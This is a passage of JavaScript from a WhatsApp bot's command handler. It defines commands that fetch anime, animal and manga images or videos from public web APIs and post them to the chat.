        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeMegumin image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animeshinobu': {
    await XliconStickWait();
    try {
        // Fetch Shinobu image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeShinobu image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animehandhold': {
    await XliconStickWait();
    try {
        // Fetch Handhold image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeHandhold image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animehighfive': {
    await XliconStickWait();
    try {
        // Fetch Highfive image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeHighfive image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

        
case 'animedance': {
    await XliconStickWait();
    try {
        // Fetch Dance image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeDance image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animehappy': {
    await XliconStickWait();
    try {
        // Fetch Happy image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeHappy image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animeglomp': {
    await XliconStickWait();
    try {
        // Fetch Glomp image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeGlomp image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animesmug': {
    await XliconStickWait();
    try {
        // Fetch Smug image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeSmug image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animeblush': {
    await XliconStickWait();
    try {
        // Fetch Blush image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeBlush image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animewave': {
    await XliconStickWait();
    try {
        // Fetch Wave image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
          caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeWave image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'animesmile': {
    await XliconStickWait();
    try {
        // Fetch Smile image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeSmile image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'animepoke': {
    await XliconStickWait();
    try {
        // Fetch Poke image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimePoke image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animewink': {
    await XliconStickWait();
    try {
        // Fetch Wink image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeWink image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animebonk': {
    await XliconStickWait();
    try {
        // Fetch Bonk image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeBonk image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animebully': {
    await XliconStickWait();
    try {
        // Fetch Bully image
        waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`);

        // Send the image with a caption
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });

    } catch (error) {
        console.error('Error fetching AnimeBully image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'animeyeet': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeYeet image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animebite': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeBite image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animelick': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeLick image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animekill': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeKill image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animecry': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeCry image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'animewlp': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeWLP image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animekiss': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeKiss image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animehug': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeHug image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animeneko': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeNeko image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animepat': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimePat image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
        
case 'animeslap': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeSlap image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animecuddle': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeCuddle image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

//ANIME GIRLS PICS        
case 'animewaifu': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeWaifu image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animenom': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeNom image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animefoxgirl': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`);
        await XliconBotInc.sendMessage(m.chat, {
            
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeFoxGirl image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animetickle': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeTickle image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animegecg': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeGecg image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;
//ANIME CMDS END        
 
        
//IMAGES CMDS        
case 'dogwoof': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching DogWoof image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case '8ballpool': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching 8BallPool image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'goosebird': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching GooseBird image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animefeed': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeFeed image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'animeavatar': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching AnimeAvatar image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'lizardpic': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
            caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching LizardPic image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

case 'catmeow': {
    await XliconStickWait();
    try {
        let waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`);
        await XliconBotInc.sendMessage(m.chat, {
            image: { url: waifudd.data.url },
           caption: `Hi ${m.pushName} 👋\n_*Here is the result of ${command} 📜✨*_`
        }, { quoted: m });
    } catch (error) {
        console.error('Error fetching CatMeow image:', error);
        replygcxlicon('⚠️ An error occurred while fetching the image. Please try again later.');
    }
}
break;

//MEW ANIME CMDS
//----------------------------------------------------------------------------------------------//


case 'bilibili': {
  if (!isPremium) return replyprem(mess.premium);
  if (!text) return replygcxlicon(`Example : ${prefix + command} https://www.bilibili.com/video/BV1cy4y1k7A2`);
  await XliconStickWait();
  try {
    // Fetch video information from the Bilibili API
    const response = await axios.get(`https://api.nexoracle.com/downloader/bilibili?apikey=free_key@maher_apis&url=${encodeURIComponent(text)}`);

    if (response.status !== 200 || !response.data.result || !response.data.result.medias || response.data.result.medias.length === 0) {
      return replygcxlicon('❌ No video found. Please check the URL and try again.');
    }

    const video = response.data.result.medias.find(media => media.videoAvailable) || response.data.result.medias[0];
    const videoUrl = video.url;

    // Prepare message with video details
    const caption = `📹 *Bilibili Video Downloaded*\n\n📂 Title: ${response.data.result.title}\n📅 Duration: ${response.data.result.duration}\n👤 Uploader: ${response.data.result.uploader}`;

    // Send video message
    await XliconBotInc.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: caption
    }, { quoted: m });

  } catch (error) {
    console.error('Failed to fetch video:', error);
    replygcxlicon('❌ An error occurred while fetching the video. Please try again later.');
  }
}
break;





case 'dailymotion': {
  if (!isPremium) return replyprem(mess.premium);
  if (!text) return replygcxlicon(`Example : ${prefix + command} https://dai.ly/x9492ja`);
  await XliconStickWait();
  try {
    // Ensure global.api is an absolute URL
    const apiUrl = new URL(`${global.api}downloader/dailymotion?apikey=${global.id}&url=${encodeURIComponent(text)}`);

    // Fetch video information from Dailymotion API
    const response = await fetch(apiUrl.toString());
    const json = await response.json();

    // Check if the response contains video data
    if (!json || !json.result || json.result.length === 0) {
      return replygcxlicon('❌ Failed to fetch video. Please try again.');
    }

    // Access the first result
    const videoInfo = json.result[0];

    // Choose the best quality video available from formats
    const bestQualityVideo = videoInfo.formats.find(format => format.format_id === 'hls-1080') || 
                             videoInfo.formats.find(format => format.format_id === 'hls-720') || 
                             videoInfo.formats[videoInfo.formats.length - 1]; // fallback to the lowest

    const videoUrl = bestQualityVideo.url;

    // Send a reaction to indicate the start of the download
    await XliconBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    // Send the video
    await XliconBotInc.sendMessage(m.chat, {
      video: { url: videoUrl },
      caption: `📹 *Dailymotion Video Downloaded*\n\n📂 Title: ${videoInfo.title}\n📅 Duration: ${videoInfo.duration_string}\n🌐 Source: ${videoInfo.source}`
    }, { quoted: m });

    // Send a reaction to indicate the download is complete
    await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (err) {
    console.error(err);
    await XliconBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
    replygcxlicon('❌ An error occurred while fetching the video. Please try again later.');
  }
}
break;

case 'animeedit': case 'amv': {
  XliconStickWait(); // Indicate that the bot is processing the request

  try {
      // List of available API URLs
      const apiUrls = [
          'https://aemt.uk.to/download/storyanime',
          'https://meitang.xyz/download/storyanime',
          'https://btch.us.kg/download/storyanime',
          'https://api.tioo.eu.org/download/storyanime',
          'https://api.tioprm.eu.org/download/storyanime'
      ];

      // Select a random API URL
      const randomApiUrl = apiUrls[Math.floor(Math.random() * apiUrls.length)];

      // Fetch anime status video from the selected API
      const response = await axios.get(randomApiUrl, {
          headers: {
              accept: 'application/json' // Set the accept header to request JSON response
          }
      });
      console.log('API Response:', response.data); // Log the response for debugging

      // Check if the response is successful and contains the result
      if (!response.data.status || !response.data.result) {
          throw new Error('Failed to fetch anime status video.');
      }

      const { title, url } = response.data.result;

      // Prepare caption and send video
      const caption = `🎬 *Enjoy your Anime Edit!* ✨`;

      await XliconBotInc.sendMessage(m.chat, {
          video: { url: url },
          caption: caption,
          mimetype: 'video/mp4', // Specify the MIME type
      }, { quoted: m });
  } catch (error) {
      console.error('Error in storyanime command:', error.message); // Log specific error message
      replygcxlicon('⚠️ An error occurred while fetching the anime status video.');
  }
}
break;
              
                
                
case 'animeinfo': {
  if (!text) return replygcxlicon(`Which anime are you looking for?`);

  const fetchAnimeInfo = async (animeName) => {
    const api = `https://abra.abrahamdw882.workers.dev/search/${encodeURIComponent(animeName)}`;

    try {
      const response = await axios.get(api);
      if (response.status !== 200 || !response.data.results || response.data.results.length === 0) {
        console.error('No results found in API response');
        return null;
      }
      return response.data.results;
    } catch (error) {
      console.error('Error fetching anime info:', error);
      return null;
    }
  };

  await XliconStickWait();
  const animeName = text.trim();
  const results = await fetchAnimeInfo(animeName);

  if (!results) {
    return replygcxlicon('❌ Failed to fetch anime information. Please try again.');
  }

  let animetxt = `Anime Information for *"${animeName}"*:\n\n`;
  results.forEach(anime => {
    animetxt += `🎀 *Title:* ${anime.title}\n🎋 *Release Date:* ${anime.releaseDate}\n🆔 *ID:* ${anime.id}\n🌐 *Link:* ${anime.link}\n🖼️ *Image:* ${anime.img}\n\n`;
  });

  await XliconBotInc.sendMessage(m.chat, {
    text: `Hi ${m.pushName}\n_*Here is the result of ${animeName}*_\n\n${animetxt}`,
    image: { url: results[0].img },
    quoted: m
  });

}
break;
               

case 'sendanimeid': {
  if (!text) return replygcxlicon(`Please provide the anime name to fetch IDs.`);

  const fetchAnimeIds = async (animeName) => {
    const api = `https://abra.abrahamdw882.workers.dev/search/${encodeURIComponent(animeName)}`;

    try {
      const response = await fetch(api);
      if (!response.ok) {
        console.error(`API response not OK: ${response.status} ${response.statusText}`);
        throw new Error('API response not OK');
      }
      const json = await response.json();
      if (json.results && json.results.length > 0) {
        return json.results.map(anime => ({ id: anime.id, title: anime.title })); // Return list of anime IDs and titles
      } else {
        console.error('No results found in API response');
      }
    } catch (error) {
      console.error(`Error fetching from ${api}:`, error);
    }
    return null; // Return null if no results found
  };

  await XliconStickWait();
  const animeName = text.trim();
  const animeData = await fetchAnimeIds(animeName);

  if (!animeData) {
    return replygcxlicon('❌ Failed to fetch anime IDs. Please try again.');
  }

  if (animeData.length === 0) {
    return replygcxlicon(`No anime IDs found for "${animeName}".`);
  }

  // Generate detailed text with title first, then ID
  let idText = `🎌 *Anime IDs for "${animeName}"* 🎌\n\n`;
  animeData.forEach((anime, index) => {
    idText += `🎥 *Title:* ${anime.title}\n🆔 *ID:* ${anime.id}\n\n`;
  });

  // Send the detailed ID and title list
  await XliconBotInc.sendMessage(m.chat, { text: idText });
}
break;

case 'animedl': {
  if (!isPremium) return replyprem(mess.premium);
  if (!text) return replygcxlicon(`Example: ${prefix + command} one-piece,1`);

  await XliconStickWait();

  try {
      const [animeId, episode] = text.split(',');
      if (!animeId || !episode) {
          return replygcxlicon('Invalid format. Please use: .animedl <anime-id>,<episode-number>');
      }

      const formattedText = `${animeId.trim()}-episode-${episode.trim()}`;
      const apiUrls = [
          `https://api2.abrahamdw882.workers.dev/download/${formattedText}`,
          `https://abra.abrahamdw882.workers.dev/download/${formattedText}`,
          `https://api1.toontamilindia.workers.dev/download/${formattedText}`
      ];

      let videoUrl = '';
      for (let apiUrl of apiUrls) {
          try {
              const response = await axios.get(apiUrl);
              if (response.status === 200) {
                  const json = response.data;
                  const keys = Object.keys(json.results);
                  if (keys.length >= 2) {
                      videoUrl = json.results[keys[1]]; // First fallback to the second result
                  }
                  if (!videoUrl && keys.length >= 1) {
                      videoUrl = json.results[keys[0]]; // Fallback to the first result if second isn't available
                  }
                  if (videoUrl) break;
              }
          } catch (error) {
              console.warn(`Failed to fetch from ${apiUrl}:`, error);
          }
      }

      if (!videoUrl) {
          return replygcxlicon('❌ No video link found. Please check the ID and episode number, and try again.');
      }

      // Prepare video details message
      const animeName = animeId.replace(/-/g, ' ');
      const caption = `📹 *Anime Video Downloaded*\n\n🌐 *Anime Website:* _Gogoanime_\n📂 *Anime Name:* _${animeName}_\n📅 *Episode No:* _${episode.trim()}_\n🆔 *Episode Id:* _${formattedText}_\n🌐 *Resolution:* _Auto_\n📜 *Subtitles Language:* _English_\n💻 *Server:* _Kali Linux_\n📅 *Download Date:* _${new Date().toLocaleDateString()}_\n⏰ *Download Time:* _${new Date().toLocaleTimeString()}_\n📥 *Downloaded By:* _ES_TEAMS-V1_\n👤 *Feature By:* _ES TEAMS TECH_`;

      // Send video and details
      await XliconBotInc.sendMessage(m.chat, {
          video: { url: videoUrl },
          caption: caption
      }, { quoted: m });

      await XliconBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (error) {
      console.error('Error fetching video:', error);
      await XliconBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
      replygcxlicon('❌ An error occurred while fetching the video. Please try again later.');
  }
}
break;
              
                
 //Manga Cmds               

case 'mangainfo': {
  const mangaTitle = text.trim();
  if (!mangaTitle) {
    return replygcxlicon('❌ Provide a manga title, e.g., mangainfo One Piece');
  }

  try {
    const mangaSearchUrl = `https://api.mangadex.org/manga?title=${encodeURIComponent(mangaTitle)}&limit=1&availableTranslatedLanguage[]=en`;
    const searchResponse = await axios.get(mangaSearchUrl);

    if (!searchResponse.data || !searchResponse.data.data || searchResponse.data.data.length === 0) {
      return replygcxlicon(`❌ No English manga found with the title "${mangaTitle}".`);
    }

    const manga = searchResponse.data.data[0];
    const { title, description, status, tags } = manga.attributes;

    const genres = tags
      .map((tag) => tag.attributes.name.en)
      .join(', ') || 'Unknown';

    const replyText = `
*📖 Manga Info:*
📚 *Title:* ${title.en || 'No title available'}
📜 *Description:* ${description.en || 'No description available'}
🔖 *Status:* ${status || 'Unknown'}
🎭 *Genres:* ${genres}
`;

    return replygcxlicon(replyText);
  } catch (error) {
    console.error('Error fetching manga info:', error.message);
    return replygcxlicon(`❌ Error fetching manga info: ${error.message}`);
  }
}
break;

case 'searchchapter': {
  const mangaTitle = text.trim();
  if (!mangaTitle) {
    return replygcxlicon('❌ Provide a manga title, e.g., searchchapter One Piece');
  }

  try {
    const mangaSearchUrl = `https://api.mangadex.org/manga?title=${encodeURIComponent(mangaTitle)}&limit=1&availableTranslatedLanguage[]=en`;
    const searchResponse = await axios.get(mangaSearchUrl);

    if (!searchResponse.data || !searchResponse.data.data || searchResponse.data.data.length === 0) {
      return replygcxlicon(`❌ No English manga found with the title "${mangaTitle}".`);
    }

    const mangaId = searchResponse.data.data[0].id;
    const chaptersUrl = `https://api.mangadex.org/chapter?manga=${mangaId}&translatedLanguage[]=en&limit=10`;
    const chaptersResponse = await axios.get(chaptersUrl);

    if (!chaptersResponse.data || chaptersResponse.data.data.length === 0) {
      return replygcxlicon(`❌ No chapters found for "${mangaTitle}".`);
    }

    const chaptersList = chaptersResponse.data.data
      .map(
        (chapter) =>
          `📘 Chapter ${chapter.attributes.chapter}: ${chapter.attributes.title || "Untitled"}`
      )
      .join('\n');

    const replyText = `*📚 Available Chapters for "${mangaTitle}":*\n${chaptersList}`;
    return replygcxlicon(replyText);
  } catch (error) {
    console.error('Error fetching chapters:', error.message);
    return replygcxlicon(`❌ Error fetching chapters: ${error.message}`);
  }
}
break;


case 'mangachapter': {
  const input = text.trim();
  if (!input) {
    return replygcxlicon('❌ Please provide a manga title and chapter, e.g., One Piece chapter 1120.');
  }

  const match = input.match(/(.+?)\s+chapter\s+(\d+)/i);
  if (!match) {
    return replygcxlicon('❌ Invalid format. Use: <title> chapter <number>');
  }

  const mangaTitle = match[1].trim();
  const chapterNumber = match[2];
  const baseUrl = 'https://api.mangadex.org';

  try {
    // Search for manga
    const searchResponse = await axios.get(`${baseUrl}/manga`, {
      params: { title: mangaTitle, limit: 1, availableTranslatedLanguage: ['en'] },
    });

    if (searchResponse.data.data.length === 0) {
      return replygcxlicon(`❌ No manga found with the title "${mangaTitle}".`);
    }

    const mangaId = searchResponse.data.data[0].id;

    // Get the chapter
    const chapterResponse = await axios.get(`${baseUrl}/chapter`, {
      params: { manga: mangaId, chapter: chapterNumber, translatedLanguage: ['en'] },
    });

